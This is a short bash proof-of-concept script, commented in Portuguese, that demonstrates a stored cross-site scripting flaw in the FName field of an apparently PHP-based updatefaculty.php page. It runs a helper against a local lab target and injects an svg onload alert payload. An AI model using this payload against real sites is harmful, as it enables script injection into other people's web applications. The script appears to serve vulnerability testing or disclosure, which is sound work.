#!/usr/bin/env bash
# PoC — Stored XSS em updatefaculty.php (campo FName / atributo value)
# Ciclo não-destrutivo via _lib/xss_poc.py (FID=106 no lab)
set -u
T="${1:-http://127.0.0.1:9292}"
LIB="$(cd "$(dirname "$0")/../_lib" && pwd)"
python3 "$LIB/xss_poc.py" "$T" "updatefaculty.php?fid=106" \
  fname '"><svg onload=alert(document.domain)>' \
  --fields fname,faname,addrs,gender,phno,city,pass
